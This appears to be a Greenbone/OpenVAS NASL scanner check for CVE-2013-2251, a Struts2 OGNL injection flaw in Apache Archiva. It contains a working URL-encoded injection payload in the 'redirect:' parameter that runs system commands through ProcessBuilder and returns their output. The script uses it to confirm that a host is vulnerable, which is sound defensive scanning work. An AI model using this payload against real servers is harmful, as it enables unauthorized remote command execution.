CPE = "cpe:/a:apache:archiva";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103883" );
	script_cve_id( "CVE-2013-2251" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Apache Archiva Multiple Remote Command Execution Vulnerabilities" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2014010087" );
	script_xref( name: "URL", value: "http://struts.apache.org/release/2.3.x/docs/s2-016.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-01-15 18:13:42 +0100 (Wed, 15 Jan 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_apache_archiva_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "apache_archiva/installed" );
	script_tag( name: "impact", value: "Successful exploits will allow remote attackers to execute arbitrary
commands within the context of the affected application." );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "Apache Archiva use Apache Struts2:
'In Struts 2 before 2.3.15.1 the information following 'action:', 'redirect:' or
'redirectAction:' is not properly sanitized. Since said information will be evaluated as
OGNL expression against the value stack, this introduces the possibility to inject server
side code.'" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Apache Archiva is prone to multiple remote command-execution
vulnerabilities." );
	script_tag( name: "affected", value: "Apache Archiva <= 1.3.6" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
cmds = exploit_commands();
for cmd in keys( cmds ) {
	url = dir + "/security/login.action?redirect:" + "${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27" + cmds[cmd] + "%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b)" + ",%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23" + "matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23" + "matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}";
	if(buf = http_vuln_check( port: port, url: url, pattern: cmd, bodyonly: TRUE )){
		buf = str_replace( string: buf, find: raw_string( 0x00 ), replace: "" );
		report = "It was possible to execute the command \"" + cmds[cmd] + "\" on the remote\nhost which produces the following output:\n\n" + buf + "\n";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

